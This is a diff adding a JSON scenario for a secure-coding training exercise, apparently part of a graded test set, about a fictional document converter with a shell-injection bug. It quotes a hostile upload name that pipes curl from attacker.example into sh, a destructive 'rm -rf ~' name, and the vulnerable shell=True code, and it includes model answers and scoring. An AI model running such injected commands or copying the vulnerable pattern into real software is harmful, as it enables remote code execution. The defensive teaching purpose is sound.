@@ -1,0 +1,913 @@
+{
+  "schemaVersion": 1,
+  "engine": {
+    "major": 1,
+    "minor": 2
+  },
+  "slug": "pyauto-shell-true-upload-name",
+  "title": "A file named 'report;rm -rf ~'",
+  "screen": {
+    "type": "data",
+    "level": 1,
+    "data": {
+      "workspace": "convert.py, the document conversion worker, Pinecrest Legal Aid (fictional)",
+      "flags": [
+        {
+          "id": "ask",
+          "label": "Security lead, Ivo Petrov",
+          "text": "An upload named 'brief.pdf; curl -s attacker.example | sh' showed up in the queue. Did it run? The worker restarts on the 11:00 deploy.",
+          "when": "true",
+          "severity": "info"
+        },
+        {
+          "id": "seen",
+          "label": "Pattern",
+          "text": "Uploaded file names are pasted into a shell command.",
+          "when": "not isNull(lookAt) and not fixed",
+          "severity": "warning"
+        },
+        {
+          "id": "lock",
+          "label": "Deploy",
+          "text": "11:00: the worker restarted on the unpatched code.",
+          "when": "not isNull(lockedAt)",
+          "severity": "error"
+        }
+      ],
+      "charts": [],
+      "tables": [],
+      "code": [
+        {
+          "id": "code",
+          "label": "convert.py",
+          "language": "Python",
+          "lines": [
+            {
+              "id": "c0",
+              "text": "cmd = f'soffice --headless --convert-to pdf {path}'",
+              "when": "fix == \"bug\"",
+              "mark": "not isNull(lookAt) ? \"error\" : \"none\""
+            },
+            {
+              "id": "c1",
+              "text": "subprocess.run(cmd, shell=True)",
+              "when": "fix == \"bug\"",
+              "mark": "not isNull(lookAt) ? \"error\" : \"none\""
+            },
+            {
+              "id": "c2",
+              "text": "subprocess.run(['soffice', '--headless', '--convert-to', 'pdf', str(path)], check=True, capture_output=True, text=True, timeout=120)",
+              "when": "fix == \"list\"",
+              "mark": "\"changed\""
+            },
+            {
+              "id": "c3",
+              "text": "subprocess.run(f'soffice --headless --convert-to pdf {shlex.quote(str(path))}', shell=True, check=True)",
+              "when": "fix == \"quote\"",
+              "mark": "\"warning\""
+            },
+            {
+              "id": "c4",
+              "text": "subprocess.run(cmd.replace(';', ''), shell=True)",
+              "when": "fix == \"strip\"",
+              "mark": "\"warning\""
+            }
+          ]
+        }
+      ],
+      "meters": [
+        {
+          "id": "due",
+          "label": "Deploy",
+          "value": "11:00"
+        }
+      ]
+    }
+  },
+  "objective": "Prevent shell injection: keep shell=False, and quote with shlex.quote only when a shell is unavoidable",
+  "secondaryObjectives": [
+    "Write subprocess.run calls with an argument list, check=True, capture_output=True and text=True"
+  ],
+  "sources": [
+    {
+      "cite": "OpenSSF, Secure Coding Guide for Python, CWE-78: OS Command Injection",
+      "checkedAt": "2026-11-17",
+      "url": "https://best.openssf.org/Secure-Coding-Guide-for-Python/CWE-707/CWE-78",
+      "note": "Read 2026-11-17 through a summarizing fetch. With shell=True 'an actual shell is invoked to run a line of commands'; building a command string from less-trusted data lets an attacker inject commands with separators such as ';'; prefer shell=False with an argument list, and Python modules such as pathlib or shutil where they exist; shell=False 'is not going to prevent all attacks' on its own."
+    },
+    {
+      "cite": "Author's scenario (REQ-333)",
+      "checkedAt": "2026-11-17",
+      "note": "Every organization, person, count and deadline is invented teaching data; tool output is an authored rendering in the tool style."
+    }
+  ],
+  "brief": {
+    "situation": "You maintain convert.py at Pinecrest Legal Aid (fictional). It converts uploaded documents with an external tool. The security lead found an upload whose name contains shell syntax. The worker is quarantined; the 11:00 deploy restarts it with whatever code is merged. It is 10:05.",
+    "handover": [
+      "The worker builds the command with an f-string and subprocess.run(cmd, shell=True).",
+      "The upload was quarantined before it was processed."
+    ],
+    "howItWorks": [
+      "Pick a step from the action list: look, change, check or ship. Nothing you pick is typed or executed: every step shows an authored result.",
+      "Each step takes working minutes, and the clock moves by the minutes it takes. The deadline runs on the same clock.",
+      "Shipping is final for this case. Afterwards you record what you found and explain your reasoning."
+    ]
+  },
+  "clock": {
+    "start": "10:05",
+    "tick": "1min",
+    "maxDuration": "150min",
+    "calendar": "clock"
+  },
+  "params": {
+    "deadline": {
+      "value": 3000,
+      "unit": "s",
+      "source": {
+        "cite": "Author's scenario (REQ-333)",
+        "checkedAt": "2026-11-17",
+        "note": "The deadline is an invented teaching value."
+      }
+    }
+  },
+  "state": {
+    "busy": {
+      "type": "bool",
+      "init": false
+    },
+    "closedAt": {
+      "type": "time",
+      "init": null
+    },
+    "documented": {
+      "type": "bool",
+      "init": false
+    },
+    "fix": {
+      "type": "enum",
+      "values": [
+        "bug",
+        "list",
+        "quote",
+        "strip"
+      ],
+      "init": "bug"
+    },
+    "lookAt": {
+      "type": "time",
+      "init": null
+    },
+    "changedAt": {
+      "type": "time",
+      "init": null
+    },
+    "lastChangeAt": {
+      "type": "time",
+      "init": null
+    },
+    "testAt": {
+      "type": "time",
+      "init": null
+    },
+    "testPassed": {
+      "type": "bool",
+      "init": false
+    },
+    "rowsAlteredOutsideFix": {
+      "type": "number",
+      "init": 0,
+      "min": 0,
+      "max": 1000000
+    },
+    "sentAs": {
+      "type": "enum",
+      "values": [
+        "unsent",
+        "wrong",
+        "right"
+      ],
+      "init": "unsent"
+    },
+    "sentAt": {
+      "type": "time",
+      "init": null
+    },
+    "lockedAt": {
+      "type": "time",
+      "init": null
+    },
+    "causeDoc": {
+      "type": "enum",
+      "values": [
+        "unset",
+        "c0",
+        "c1",
+        "c2"
+      ],
+      "init": "unset"
+    },
+    "checkDoc": {
+      "type": "enum",
+      "values": [
+        "unset",
+        "k0",
+        "k1",
+        "k2"
+      ],
+      "init": "unset"
+    }
+  },
+  "derived": {
+    "fixed": {
+      "expr": "(fix == \"list\")"
+    },
+    "correct": {
+      "expr": "(fix == \"list\" or fix == \"quote\")"
+    },
+    "sent": {
+      "expr": "sentAs != \"unsent\""
+    },
+    "sentSec": {
+      "expr": "not isNull(sentAt) ? timeAt(sentAt) : -1"
+    },
+    "lookedFirst": {
+      "expr": "not isNull(lookAt) and (isNull(changedAt) or timeAt(lookAt) <= timeAt(changedAt))"
+    },
+    "checkedCurrent": {
+      "expr": "testPassed and not isNull(testAt) and timeAt(testAt) >= timeAt(lastChangeAt)"
+    }
+  },
+  "processes": [],
+  "phases": {
+    "work": {
+      "label": "Working the problem",
+      "clock": "turns",
+      "actions": [
+        "look",
+        "change",
+        "check",
+        "ship",
+        "wait",
+        "finish"
+      ]
+    },
+    "report": {
+      "label": "Record",
+      "clock": "stopped",
+      "actions": [
+        "document"
+      ]
+    }
+  },
+  "initialPhase": "work",
+  "actions": {
+    "look": {
+      "label": "Replay the quarantined name against a test worker with a canary command",
+      "group": "Look",
+      "available": "not busy",
+      "why": "Wait for the running step to finish.",
+      "effects": [
+        {
+          "if": "isNull(lookAt)",
+          "then": [
+            {
+              "set": "lookAt",
+              "to": "t"
+            }
+          ]
+        },
+        {
+          "if": "fixed",
+          "then": [
+            {
+              "output": "soffice: file 'brief.pdf; curl -s attacker.example | sh' not found; no canary created"
+            }
+          ],
+          "else": [
+            {
+              "output": "canary file /tmp/INJECTED created: the shell ran the second command"
+            }
+          ]
+        },
+        {
+          "if": "fixed",
+          "then": [
+            {
+              "finding": "The name reaches the tool as one argument; no shell is involved."
+            }
+          ],
+          "else": [
+            {
+              "finding": "With shell=True the f-string is parsed by a shell, so ; starts a second command."
+            }
+          ]
+        },
+        {
+          "set": "busy",
+          "to": "true"
+        },
+        {
+          "schedule": "work",
+          "after": "4min"
+        }
+      ]
+    },
+    "change": {
+      "label": "Change how the converter is called",
+      "group": "Change",
+      "available": "not busy",
+      "why": "Wait for the running step to finish.",
+      "params": [
+        {
+          "id": "f",
+          "kind": "choice",
+          "label": "Change",
+          "options": [
+            {
+              "value": "list",
+              "label": "Argument list with shell=False (the default), check=True, capture_output=True, text=True and a timeout"
+            },
+            {
+              "value": "quote",
+              "label": "Keep shell=True and wrap the path in shlex.quote()"
+            },
+            {
+              "value": "strip",
+              "label": "Strip semicolons from the command string"
+            }
+          ]
+        }
+      ],
+      "effects": [
+        {
+          "if": "isNull(changedAt)",
+          "then": [
+            {
+              "set": "changedAt",
+              "to": "t"
+            }
+          ]
+        },
+        {
+          "set": "lastChangeAt",
+          "to": "t"
+        },
+        {
+          "set": "fix",
+          "to": "f"
+        },
+        {
+          "set": "testPassed",
+          "to": "false"
+        },
+        {
+          "log": "Changed: {f}.",
+          "kind": "act"
+        },
+        {
+          "set": "busy",
+          "to": "true"
+        },
+        {
+          "schedule": "work",
+          "after": "5min"
+        }
+      ]
+    },
+    "check": {
+      "label": "Run the injection tests (40 hostile names with a canary) and a normal conversion",
+      "group": "Check",
+      "available": "not busy",
+      "why": "Wait for the running step to finish.",
+      "effects": [
+        {
+          "set": "testAt",
+          "to": "t"
+        },
+        {
+          "cases": [
+            {
+              "when": "fix == \"list\"",
+              "then": [
+                {
+                  "set": "testPassed",
+                  "to": "true"
+                },
+                {
+                  "output": "canary not created for 40 hostile names; normal files convert; failures raise CalledProcessError\n3 passed"
+                }
+              ]
+            },
+            {
+              "when": "fix == \"quote\"",
+              "then": [
+                {
+                  "set": "testPassed",
+                  "to": "true"
+                },
+                {
+                  "output": "canary not created for 40 hostile names\n3 passed (still invokes a shell)"
+                }
+              ]
+            },
+            {
+              "when": "fix == \"strip\"",
+              "then": [
+                {
+                  "output": "canary created by 'x && touch /tmp/INJECTED'\n1 failed"
+                }
+              ]
+            },
+            {
+              "when": "true",
+              "then": [
+                {
+                  "output": "canary created by 37 of 40 names\n1 failed"
+                }
+              ]
+            }
+          ]
+        },
+        {
+          "set": "busy",
+          "to": "true"
+        },
+        {
+          "schedule": "work",
+          "after": "3min"
+        }
+      ]
+    },
+    "ship": {
+      "label": "Merge before the 11:00 deploy",
+      "group": "Ship",
+      "available": "not busy and not sent",
+      "why": "Already done.",
+      "effects": [
+        {
+          "set": "sentAs",
+          "to": "correct ? \"right\" : \"wrong\""
+        },
+        {
+          "set": "sentAt",
+          "to": "t"
+        },
+        {
+          "if": "correct",
+          "then": [
+            {
+              "output": "Merged: the worker restarts without a shell."
+            }
+          ],
+          "else": [
+            {
+              "output": "Merged: the worker restarts still injectable."
+            }
+          ]
+        },
+        {
+          "set": "busy",
+          "to": "true"
+        },
+        {
+          "schedule": "work",
+          "after": "2min"
+        }
+      ]
+    },
+    "wait": {
+      "label": "Wait 10 minutes",
+      "group": "Wait",
+      "available": "not busy",
+      "why": "Wait for the running step to finish.",
+      "effects": [
+        {
+          "log": "You wait 10 minutes.",
+          "kind": "act"
+        },
+        {
+          "set": "busy",
+          "to": "true"
+        },
+        {
+          "schedule": "work",
+          "after": "10min"
+        }
+      ]
+    },
+    "finish": {
+      "label": "Done: record what you found",
+      "group": "Close",
+      "available": "not busy",
+      "why": "Wait for the running step to finish.",
+      "effects": [
+        {
+          "cancel": "work"
+        },
+        {
+          "set": "busy",
+          "to": "false"
+        },
+        {
+          "set": "closedAt",
+          "to": "t"
+        },
+        {
+          "log": "You stop and write it up.",
+          "kind": "act"
+        },
+        {
+          "phase": "report"
+        }
+      ]
+    },
+    "document": {
+      "label": "Record the cause and the check",
+      "group": "Report",
+      "available": "not documented",
+      "why": "Done.",
+      "params": [
+        {
+          "id": "record",
+          "kind": "form",
+          "label": "Record",
+          "fields": [
+            {
+              "id": "cause",
+              "label": "Why the name was dangerous",
+              "options": [
+                {
+                  "value": "c0",
+                  "label": "shell=True let a shell parse the uploaded name, so ; started another command"
+                },
+                {
+                  "value": "c1",
+                  "label": "The tool has a bug"
+                },
+                {
+                  "value": "c2",
+                  "label": "The upload was a virus"
+                }
+              ]
+            },
+            {
+              "id": "check",
+              "label": "How you know it is safe",
+              "options": [
+                {
+                  "value": "k0",
+                  "label": "Forty hostile names create no canary, and normal files convert"
+                },
+                {
+                  "value": "k1",
+                  "label": "The quarantined file failed to convert"
+                },
+                {
+                  "value": "k2",
+                  "label": "Not checked"
+                }
+              ]
+            }
+          ]
+        }
+      ],
+      "effects": [
+        {
+          "set": "causeDoc",
+          "to": "cause"
+        },
+        {
+          "set": "checkDoc",
+          "to": "check"
+        },
+        {
+          "log": "Recorded: cause {cause}, check {check}.",
+          "kind": "act"
+        },
+        {
+          "set": "documented",
+          "to": "true"
+        }
+      ]
+    }
+  },
+  "timers": {
+    "work": {
+      "label": "Step running",
+      "wait": {
+        "skipLabel": "Let the step finish"
+      },
+      "instances": "one",
+      "source": {
+        "cite": "Author's scenario (REQ-333)",
+        "checkedAt": "2026-11-17",
+        "note": "Working minutes per step are invented teaching values."
+      },
+      "effects": [
+        {
+          "set": "busy",
+          "to": "false"
+        }
+      ]
+    }
+  },
+  "triggers": [
+    {
+      "id": "lock",
+      "when": "t >= deadline and not sent",
+      "mode": "once",
+      "interruptsSkip": true,
+      "effects": [
+        {
+          "set": "lockedAt",
+          "to": "t"
+        },
+        {
+          "log": "11:00: the worker restarted on the unpatched code.",
+          "kind": "alarm"
+        }
+      ]
+    },
+    {
+      "id": "writeUp",
+      "when": "phase == \"report\"",
+      "mode": "once",
+      "effects": [
+        {
+          "reason": "writeup"
+        }
+      ]
+    }
+  ],
+  "reasoning": {
+    "writeup": {
+      "question": "For the security lead: why the name was dangerous, what you changed, and how you know.",
+      "pausesClock": true,
+      "parts": [
+        {
+          "label": "Why",
+          "criteria": "shell=True hands the command string to a shell, which treats ; && | and $( ) in data as syntax; the name came from an untrusted upload.",
+          "modelAnswer": "A shell parsed user data."
+        },
+        {
+          "label": "What you changed",
+          "criteria": "Pass an argument list with shell=False so the name is one argument, with check=True, capture_output and a timeout; shlex.quote only if a shell were unavoidable; stripping characters misses others.",
+          "modelAnswer": "An argument list, no shell."
+        },
+        {
+          "label": "How you know",
+          "criteria": "A canary test with many hostile names creates nothing, and normal conversions still work.",
+          "modelAnswer": "40 of 40 blocked."
+        }
+      ]
+    }
+  },
+  "outcome": {
+    "profile": "data",
+    "thresholds": {
+      "deliverWindow": {
+        "value": 3000,
+        "source": {
+          "cite": "Author's scenario (REQ-333)",
+          "checkedAt": "2026-11-17",
+          "note": "The case's deadline; invented."
+        }
+      }
+    },
+    "noProgress": {
+      "when": "documented and not sent",
+      "class": "recovered",
+      "rationale": "Shipping nothing ships nothing wrong, but the deadline passes without the fix.",
+      "source": {
+        "cite": "Author's scenario (REQ-333)",
+        "checkedAt": "2026-11-17",
+        "note": "An invented teaching scenario."
+      }
+    }
+  },
+  "endings": {
+    "wrongSent": {
+      "label": "Injectable worker deployed",
+      "class": "harm",
+      "terminal": true,
+      "when": "documented and sentAs == \"wrong\"",
+      "narrative": "Anyone who can upload can run commands on the worker."
+    },
+    "notSent": {
+      "label": "Nothing shipped",
+      "class": "recovered",
+      "terminal": true,
+      "when": "documented and not sent",
+      "narrative": "The worker stayed down past the deploy; documents queue up."
+    },
+    "right": {
+      "label": "Right, checked, on time",
+      "class": "target",
+      "terminal": true,
+      "when": "documented and sentAs == \"right\" and fixed and sentSec <= deadline and checkedCurrent and lookedFirst",
+      "narrative": "Uploaded names are just names again."
+    },
+    "gaps": {
+      "label": "Right, with gaps",
+      "class": "recovered",
+      "terminal": true,
+      "when": "documented",
+      "narrative": "The result is right, but it went late, unchecked, before you looked, or with a weaker fix."
+    },
+    "time_up": {
+      "label": "Time up",
+      "class": "recovered",
+      "terminal": true,
+      "narrative": "The case reached its time limit with nothing recorded."
+    }
+  },
+  "endingOrder": [
+    "wrongSent",
+    "notSent",
+    "right",
+    "gaps"
+  ],
+  "scoring": {
+    "criteria": [
+      {
+        "id": "looked",
+        "label": "Reproduced the injection safely before changing code",
+        "weight": 1,
+        "critical": true,
+        "rows": [
+          {
+            "when": "lookedFirst",
+            "score": "met",
+            "why": "Looked first."
+          },
+          {
+            "when": "not isNull(lookAt)",
+            "score": "partial",
+            "why": "Looked only after a change."
+          },
+          {
+            "when": "true",
+            "score": "missed",
+            "why": "Never looked before acting."
+          }
+        ]
+      },
+      {
+        "id": "fixed",
+        "label": "Called the tool with an argument list and no shell",
+        "weight": 1,
+        "critical": true,
+        "rows": [
+          {
+            "when": "fixed",
+            "score": "met",
+            "why": "No shell: an argument list."
+          },
+          {
+            "when": "fix == \"quote\"",
+            "score": "partial",
+            "why": "Safe for this name, but keeps a shell nobody needs."
+          },
+          {
+            "when": "true",
+            "score": "missed",
+            "why": "{fix == \"strip\" ? \"Shells have many separators; && and $( ) still run commands.\" : \"A shell still parses the uploaded name.\"}"
+          }
+        ]
+      },
+      {
+        "id": "shipped",
+        "label": "Shipped nothing wrong",
+        "weight": 1,
+        "critical": true,
+        "rows": [
+          {
+            "when": "sentAs != \"wrong\"",
+            "score": "met",
+            "why": "Nothing wrong shipped."
+          },
+          {
+            "when": "true",
+            "score": "missed",
+            "why": "Shipped a wrong result."
+          }
+        ]
+      },
+      {
+        "id": "checked",
+        "label": "Injection tests passed after the last change, before the deploy",
+        "weight": 1,
+        "rows": [
+          {
+            "when": "checkedCurrent and (not sent or timeAt(testAt) <= sentSec)",
+            "score": "met",
+            "why": "Checked after the last change, before shipping."
+          },
+          {
+            "when": "not isNull(testAt)",
+            "score": "partial",
+            "why": "Checked, but it failed or came before a later change."
+          },
+          {
+            "when": "true",
+            "score": "missed",
+            "why": "Never checked."
+          }
+        ]
+      },
+      {
+        "id": "note",
+        "label": "The record names the cause and the check",
+        "weight": 1,
+        "rows": [
+          {
+            "when": "causeDoc == \"c0\" and checkDoc == \"k0\"",
+            "score": "met",
+            "why": "Cause and check both right."
+          },
+          {
+            "when": "causeDoc == \"c0\" or checkDoc == \"k0\"",
+            "score": "partial",
+            "why": "Half right."
+          },
+          {
+            "when": "true",
+            "score": "missed",
+            "why": "Neither is recorded right."
+          }
+        ]
+      }
+    ],
+    "reasoningCriteria": [
+      {
+        "moment": "writeup",
+        "label": "Written explanation",
+        "weight": 1
+      }
+    ],
+    "kpis": [
+      {
+        "id": "rightK",
+        "label": "Right result shipped",
+        "value": "sentAs == \"right\" ? 1 : 0",
+        "format": "number",
+        "expert": "1"
+      },
+      {
+        "id": "altered",
+        "label": "Rows changed outside the fix",
+        "value": "rowsAlteredOutsideFix",
+        "format": "number",
+        "expert": "0"
+      },
+      {
+        "id": "sentAtMin",
+        "label": "Minutes until shipped",
+        "value": "sent ? sentSec / 60 : 0",
+        "format": "number",
+        "expert": "about 14"
+      }
+    ],
+    "expertPath": [
+      {
+        "at": "0-4 min",
+        "text": "Canary replay: the shell ran the second command."
+      },
+      {
+        "at": "4-9 min",
+        "text": "Argument list, shell=False, check=True, timeout."
+      },
+      {
+        "at": "9-12 min",
+        "text": "Injection tests pass."
+      },
+      {
+        "at": "12-14 min",
+        "text": "Merge before the deploy."
+      }
+    ],
+    "debrief": {
+      "right": {
+        "headline": "Good: no shell, no injection",
+        "body": "An argument list gives the program its arguments directly; nothing in a file name can become syntax."
+      },
+      "gaps": {
+        "headline": "Right, with gaps",
+        "body": "The result is right; it went late, unchecked, before you looked, or with a weaker fix than the cause called for."
+      },
+      "wrongSent": {
+        "headline": "Still injectable",
+        "body": "Blocklisting characters loses: shells have too many ways to chain commands. Remove the shell."
+      },
+      "notSent": {
+        "headline": "Nothing shipped",
+        "body": "Safe, but the deadline passed without the fix."
+      },
+      "time_up": {
+        "headline": "Time up",
+        "body": "Nothing was recorded before the case's limit."
+      }
+    },
+    "modelReasoning": "A file name with ; and a pipe in it is harmless until a shell parses it. subprocess.run(cmd, shell=True) with an f-string does exactly that, so the name's second half would run as a command. Pass an argument list with shell=False, so the name is a single argument, and add check=True, capture_output=True, text=True and a timeout. shlex.quote is the fallback only when a shell is unavoidable; stripping semicolons misses &&, | and $( )."
+  }
+}
